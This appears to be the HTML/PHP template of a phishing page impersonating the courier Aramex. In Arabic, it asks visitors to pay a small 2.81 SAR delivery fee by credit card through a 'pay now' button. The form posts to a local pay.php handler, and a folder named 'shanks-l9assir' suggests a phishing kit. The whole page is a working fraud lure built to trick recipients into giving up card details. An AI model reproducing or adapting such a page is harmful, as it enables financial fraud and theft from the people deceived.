...
<head id="Head1">
    ...
    <link rel="stylesheet" type="text/css" href="./Confirm/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="./Confirm/main.css">
        
       <title>Aramex Post</title>
    ...
    <script language="javascript" type="text/javascript"
            src="./Confirm/jquery-1.js"></script>
    <script language="javascript" type="text/javascript"
            src="./Confirm/jquery-1_002.js"></script>
    <script language="javascript" type="text/javascript"
            src="./Confirm/jquery-ui-1.js"></script>
...
<form name="formInterfaz" method="post" action="./pay.php" id="formInterfaz">
    <div>
    ...
    <script src="./Confirm/WebResource.js" type="text/javascript"></script>
    ...
    <script src="./Confirm/ScriptResource_002.js" type="text/javascript"></script>
    <script type="text/javascript">
        //<![CDATA[
    ...
    <script src="./Confirm/ScriptResource.js" type="text/javascript"></script>
    <div>
    ...
    <div class="wrapper" style="align-content: center;">
        ...
        <section style="align-content: center;">
            <div id="cabecera" class="container ogilvy-bg-white" style="align-content: center;">
                <div class="row" style="align-content: center;">
                    <div class="col-xs-12 text-center ogilvy-header" style="align-content: center;">
 <img class="aramex" src="./shanks-l9assir/aramex.png" width="180" height="150"  alt="aramex">
                        ...
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                            ...
                                            <span id="fecha" class="descripcionPago"
                                                  style="font-weight:bold;"></span><span id="Fechavalor"
                                                                                               style="font-weight:normal;"><?php echo ('DATE '); echo date('d/m/Y'); ?></span>
                                        </div>
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;"> &#x62e;&#x637;&#x648;&#x629; 1</span><span
                                                    id="conceptovalor" style="font-weight:normal;"> : &#x62f;&#x641;&#x639;&#x20;&#x631;&#x633;&#x648;&#x645;&#x20;&#x627;&#x644;&#x62a;&#x633;&#x644;&#x64a;&#x645;</span>
                                        </div>
                                    </div>
                                ...
                                <div class="ogilvy-titular">
                                    <span id="lbTitle" style="text-decoration: underline;" class="titulo">2,81 SAR : &#x627;&#x644;&#x645;&#x628;&#x644;&#x63a;&#x20;&#x627;&#x644;&#x645;&#x633;&#x62a;&#x62d;&#x642;</span>
                                </div>
                                ...
                                <div id="divMetodoPago" class="ogilvy-metodo centerBlock">
                                    ...
                                    <div class="ogilvy-iconomediodepago">
                                        <img id="imgPago" class="ogilvy-imagenpago"
                                             src="./Confirm/ogilvy-iconoTarjeta.png"
                                                ...
                                                <td style="width:370px;" align="left">
                                                    <div class="div_relleno"
                                                        ...
                                                        <span id="GridViewPagoSimple_ctl02_lbDesPagoSimple"
                                                              class="descripcionPago">Kreditkarte</span>
                        ...
                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 ogilvy-seleccionpago ogilvy-espacioseccion">
                            <div class="col-xs-12">
                                <div class="ogilvy-botonrelleno ogilvy-Sweep">
                                    <input type="button" name="bSiguiente" value="&#x627;&#x62f;&#x641;&#x639;&#x20;&#x627;&#x644;&#x627;&#x646;"
